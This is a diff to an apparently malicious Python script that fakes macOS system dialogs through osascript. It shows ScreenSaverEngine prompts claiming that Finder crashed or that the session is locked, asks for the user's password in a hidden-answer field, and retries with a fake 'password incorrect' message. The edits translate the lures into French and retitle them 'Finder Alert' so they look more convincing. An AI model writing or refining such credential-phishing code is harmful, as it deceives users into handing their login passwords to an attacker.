@@ -25,7 +25,7 @@ def whoami():
 
 
 def retrypassword():
-    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue. Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
+    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Entrez votre mot de passe pour débloquer la session. Mot de passe incorrect!" & return  default answer "" with icon stop with hidden answer with title "Finder Alert"'""", stdout=subprocess.PIPE, shell=True)
     text = process.communicate()
     return text[0]
 
@@ -55,7 +55,7 @@ def run(exitCount):
     try:
         print "Starting"
         subprocess.Popen('sudo whoami', stdout=subprocess.PIPE, shell=True)
-        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Finder s\'est arrete de maniere imprevue. Identifiez-vous pour relancer l\'application." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
+        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Entrez votre mot de passe pour débloquer la session." & return  default answer "" with icon stop with hidden answer with title "Finder Alert"'""", stdout=subprocess.PIPE, shell=True)
         text = process.communicate()
         text = text[0]
         count = 0
